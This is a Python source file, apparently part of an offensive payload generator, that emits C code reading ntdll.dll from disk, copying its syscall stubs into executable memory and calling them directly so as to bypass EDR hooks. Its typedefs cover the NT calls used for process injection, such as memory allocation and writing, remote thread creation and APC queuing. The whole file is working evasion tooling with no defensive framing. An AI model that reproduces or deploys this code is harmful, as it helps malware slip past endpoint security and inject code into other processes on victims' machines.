import os
import re
from typing import List, Dict, Tuple, Optional

class GetSyscallStub:
    """
    GetSyscallStub implementation that reads ntdll.dll directly from disk
    to bypass EDR hooks.
    """
    
    def __init__(self):
        self.typedef_templates = self._init_typedef_templates()
        
    def _init_typedef_templates(self) -> Dict[str, str]:
        """Initialize templates for common NT function typedefs"""
        return {
            "NtAllocateVirtualMemory": """
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);""",
            "NtWriteVirtualMemory": """
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);""",
            "NtProtectVirtualMemory": """
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);""",
            "NtCreateThreadEx": """
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);""",
            "NtWaitForSingleObject": """
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);""",
            "NtClose": """
typedef NTSTATUS (NTAPI *pNtClose)(
    HANDLE Handle
);""",
            "NtOpenProcess": """
typedef NTSTATUS (NTAPI *pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);""",
            "NtQueueApcThread": """
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);""",
            "NtTestAlert": """
typedef NTSTATUS (NTAPI *pNtTestAlert)();
""",
            "NtResumeThread": """
typedef NTSTATUS (NTAPI *pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);""",
            "NtDelayExecution": """
typedef NTSTATUS (NTAPI *pNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
);""",
            "NtFreeVirtualMemory": """
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);""",
        }
    
    def generate_typedefs(self, nt_functions: List[str]) -> str:
        """Generate typedefs for the specified NT functions"""
        typedefs = []
        
        for func in nt_functions:
            if func in self.typedef_templates:
                typedefs.append(self.typedef_templates[func])
            else:
                # Generic typedef for functions not explicitly defined
                typedefs.append(f"""
typedef NTSTATUS (NTAPI *p{func})(
    /* Add appropriate parameters for {func} */
);""")
        
        return "\n".join(typedefs)
    
    def generate_function_declarations(self, nt_functions: List[str]) -> str:
        """Generate function declarations for the specified NT functions"""
        declarations = []
        
        for func in nt_functions:
            declarations.append(f"p{func} {func};")
        
        return "\n".join(declarations)
    
    def generate_helper_functions(self) -> str:
        """Generate helper functions for syscall stub extraction"""
        return """
// Constants for syscall stub extraction
#define SYSCALL_STUB_SIZE 23

// Helper function to convert RVA to raw file offset
PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section) {
    return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

// Function to extract syscall stub for a specific NT function
BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, 
                   LPVOID fileData, PIMAGE_SECTION_HEADER textSection, 
                   PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub) {
    PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + exportDirectory->AddressOfNames, rdataSection);
    PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + exportDirectory->AddressOfFunctions, rdataSection);
    PWORD addressOfNameOrdinals = (PWORD)RVAtoRawOffset((DWORD_PTR)fileData + exportDirectory->AddressOfNameOrdinals, rdataSection);
    BOOL stubFound = FALSE;

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        LPCSTR currentFunctionName = (LPCSTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
        
        if (strcmp(currentFunctionName, functionName) == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRVA = addressOfFunctions[ordinal];
            LPVOID functionAddr = RVAtoRawOffset((DWORD_PTR)fileData + functionRVA, textSection);
            
            memcpy(syscallStub, functionAddr, SYSCALL_STUB_SIZE);
            stubFound = TRUE;
            break;
        }
    }

    return stubFound;
}
"""
    
    def generate_initialization_code(self, nt_functions: List[str]) -> str:
        """Generate code to initialize function pointers by reading ntdll.dll from disk"""
        init_code = """
// Load ntdll.dll from disk to extract clean syscall stubs
HANDLE file = CreateFileA("c:\\\\windows\\\\system32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if (file == INVALID_HANDLE_VALUE) {
    std::cerr << "Failed to open ntdll.dll file" << std::endl;
    return 1;
}

DWORD fileSize = GetFileSize(file, NULL);
LPVOID fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
if (!fileData) {
    std::cerr << "Failed to allocate memory for ntdll.dll" << std::endl;
    CloseHandle(file);
    return 1;
}

DWORD bytesRead = 0;
if (!ReadFile(file, fileData, fileSize, &bytesRead, NULL)) {
    std::cerr << "Failed to read ntdll.dll file" << std::endl;
    HeapFree(GetProcessHeap(), 0, fileData);
    CloseHandle(file);
    return 1;
}
CloseHandle(file);

// Parse PE headers to locate sections and export directory
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
PIMAGE_SECTION_HEADER textSection = NULL;
PIMAGE_SECTION_HEADER rdataSection = NULL;

// Find .text and .rdata sections
for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) {
    if (strcmp((CHAR*)section->Name, ".text") == 0) {
        textSection = section;
    }
    else if (strcmp((CHAR*)section->Name, ".rdata") == 0) {
        rdataSection = section;
    }
    section++;
}

if (!textSection || !rdataSection) {
    std::cerr << "Failed to locate required sections in ntdll.dll" << std::endl;
    HeapFree(GetProcessHeap(), 0, fileData);
    return 1;
}

PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset(
    (DWORD_PTR)fileData + exportDirRVA, rdataSection);
"""

        # Generate stub extraction code for each function
        function_stubs = []
        for func in nt_functions:
            function_stubs.append(f"""
// Extract syscall stub for {func}
unsigned char {func}_stub[SYSCALL_STUB_SIZE] = {{0}};
if (!GetSyscallStub("{func}", exportDirectory, fileData, textSection, rdataSection, {func}_stub)) {{
    std::cerr << "Failed to find syscall stub for {func}" << std::endl;
    HeapFree(GetProcessHeap(), 0, fileData);
    return 1;
}}

// Make the stub executable
DWORD oldProtect_{func} = 0;
if (!VirtualProtect({func}_stub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect_{func})) {{
    std::cerr << "Failed to make {func} stub executable" << std::endl;
    HeapFree(GetProcessHeap(), 0, fileData);
    return 1;
}}

// Create function pointer to the stub
{func} = (p{func}){func}_stub;
""")

        # Cleanup code
        cleanup_code = """
// Free the file data
HeapFree(GetProcessHeap(), 0, fileData);
"""

        return init_code + "\n" + "\n".join(function_stubs) + "\n" + cleanup_code
    
    def generate_header(self, nt_functions: List[str], output_path: str) -> None:
        """Generate header file with typedefs and function declarations"""
        header_content = """#pragma once
#include <windows.h>


"""
        header_content += self.generate_typedefs(nt_functions)
        header_content += "\n\n// Function declarations\n"
        header_content += self.generate_function_declarations(nt_functions)
        
        # Write header file
        with open(output_path, 'w') as f:
            f.write(header_content)
    
    def generate_module_components(self, nt_functions: List[str]) -> List[Dict[str, str]]:
        """Generate module components for the SyscallsController"""
        helper_functions = self.generate_helper_functions()
        initialization_code = self.generate_initialization_code(nt_functions)
        
        components = [
            {
                "type": "define",
                "content": helper_functions
            },
            {
                "type": "syscalls",
                "content": initialization_code
            }
        ]
        
        return components

def compute_syscall_module(nt_functions: List[str], output_dir: str = None) -> Tuple[str, List[Dict[str, str]]]:
    """
    Main function to generate GetSyscallStub implementation
    
    Args:
        nt_functions: List of NT functions to include
        output_dir: Directory to write header file (optional)
        
    Returns:
        Tuple containing:
        - Compiler options string
        - List of module components for SyscallsController
    """
    generator = GetSyscallStub()
    
    # Generate header file if output_dir is provided
    if output_dir:
        os.makedirs(output_dir, exist_ok=True)
        header_path = os.path.join(output_dir, "GetSyscallStub.h")
        generator.generate_header(nt_functions, header_path)
    
    # Generate module components
    components = generator.generate_module_components(nt_functions)
    
    return components